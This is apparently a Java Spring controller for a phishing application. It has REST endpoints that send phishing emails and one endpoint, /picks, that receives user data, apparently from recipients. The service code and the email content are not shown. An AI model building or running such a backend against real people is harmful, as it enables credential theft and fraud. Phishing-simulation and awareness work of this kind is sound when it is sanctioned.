package com.belen.phishing.controllers;

import com.belen.phishing.dto.PhishingEntrada;
import com.belen.phishing.dto.PhishingRequest;
import com.belen.phishing.dto.UserDataRequest;
import com.belen.phishing.service.PhishingService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/phishing")
@CrossOrigin(origins = "*")
public class PhishingController {

    private final PhishingService phishingService;

    @Autowired
    public PhishingController(PhishingService phishingService) {
        this.phishingService = phishingService;
    }

    @PostMapping("/manual")
    public ResponseEntity<String> sendPhishingEmail(@RequestBody PhishingRequest phishingRequest) {
        try {
            phishingService.sendPhishingEmail(phishingRequest);
            return new ResponseEntity<>("Phishing email sent successfully!", HttpStatus.OK);
        } catch (Exception e) {
            return new ResponseEntity<>("Failed to send phishing email: " + e.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }

    @PostMapping("/entrada")
    public ResponseEntity<String> enterPhishingEmail(@RequestBody PhishingEntrada phisingEntrada) {
        try {
            phishingService.phishingEntrada(phisingEntrada);
            return new ResponseEntity<>("Phishing email sent successfully!", HttpStatus.OK);
        } catch (Exception e) {
            return new ResponseEntity<>("Failed to send phishing email: " + e.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }

    @PostMapping("/picks")
    public ResponseEntity<String> sendUserData(@RequestBody UserDataRequest userDataRequest) {
        try {
            phishingService.phishingPick(userDataRequest);
            return new ResponseEntity<>("User data received successfully!", HttpStatus.OK);
        } catch (Exception e) {
            return new ResponseEntity<>("Failed to process user data: " + e.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
}